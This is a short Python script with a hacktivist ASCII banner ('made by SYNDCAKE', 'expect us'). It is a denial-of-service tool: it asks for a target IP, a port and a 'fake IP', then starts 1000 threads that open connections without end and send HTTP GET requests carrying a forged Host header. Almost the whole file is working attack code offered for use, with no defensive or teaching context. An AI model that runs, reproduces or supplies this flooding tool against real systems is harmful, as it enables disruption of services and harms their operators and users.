#!/usr/bin/python3

import socket
import threading

print("                                                     ")
print("                     __    _____                             ")
print("                   _/_ \  /_____`.__                    ")
print("               _,.'_/ / \/`._   `.__\                         ")
print("              /_ /__.`  |    `----,__\                              ")
print("             /__.'      |                                ")
print("                        \                                ")
print("                       / \                               ")
print("                      /   '\                              ")
print("              _______/      \                                    ")
print("            ,'    ###',      \______                             ")
print("           /        ###\    ,'    ##',                       ")
print("          |          ###|  /       ###\                  ")
print("          |            #| |          ##|                   ")
print("           \           /  |           #|                    ")
print("            ',_______,'    \          /                          ")
print("                            ',______,'                   ")
print("    _________ __                                        ")
print("   /         |  |                                      ")
print("  |      ____|  |___  ______ _ ____ _ ____    ___                           ")
print("  |     /    |      \/      \ '    | '    |  /  /               ")
print("  |     \____|   _   |   -   |  ___|   ___|\/  /                        ")
print("  |          |  | |  |    __/  |   |  |   \   /                  ")
print("   \_________|__| |__|______|__|   |__|   /  /                                 ")
print("                                         /__/         ")
print("<<<<<<<<<<<<<<<<< made by SYNDCAKE >>>>>>>>>>>>>>>>                                            ")
print("                       1.0.0                                                       ")
print("                  -> expect us <-                                                   ")
print("<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>                                                    ")

target = input("[~] Enter Target IP Address -> ")
port = int(input("[~] Enter Target Port To Attack -> "))
fake_ip = input("[~] Enter Fake IP Address -> ")

connected = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + " \r\n\r\n").encode('ascii'), (target, port))
        s.close()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + " \r\n\r\n").encode('ascii'), (target, port))
        s.close()


        global connected
        connected += 1
        print(connected)


for i in range(1000):
    thread = threading.Thread(target=attack)
    thread.start()
